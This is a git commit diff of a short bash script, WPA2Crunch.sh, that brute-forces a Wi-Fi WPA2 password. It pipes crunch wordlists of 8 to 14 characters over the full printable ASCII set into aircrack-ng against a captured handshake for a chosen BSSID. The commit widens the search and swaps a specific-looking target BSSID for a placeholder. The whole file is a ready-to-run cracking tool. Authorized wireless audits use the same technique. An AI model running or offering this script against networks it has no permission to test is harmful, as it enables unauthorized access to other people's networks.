726a53b291991ea46e03acee667c2eb0973885c4
Guy <63149805+Fax2u@users.noreply.github.com>
2024-02-22 11:26:28 +0200

    Add files via upload

--- WPA2Crunch.sh
+++ WPA2Crunch.sh
@@ -1,18 +1,26 @@
 #!/bin/bash
 
 # Set the minimum and maximum password length and character set
-min_length=14
+min_length=8
 max_length=14
-charset="0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()-_=+"
+
+# Set the character set
+# All ASCII Charset
+charset=" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_\`abcdefghijklmnopqrstuvwxyz{|}~"
+
+# Common Charset
+#charset="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+'\""
+
 
 # Define the BSSID (replace with the target Wi-Fi network's BSSID)
-bssid="3C:7C:3F:93:01:10"
+bssid="00:00:00:00:00:00"
 
 # Define the capture file (replace with the actual capture file)
-capture_file="mywifi-03.cap"
+capture_file="wifi.cap"
 
 # Loop to generate and test passwords
 for ((length = min_length; length <= max_length; length++)); do
     echo "Generating and testing passwords of length $length..."
     crunch $length $length $charset | aircrack-ng -w - -b $bssid $capture_file
 done
+
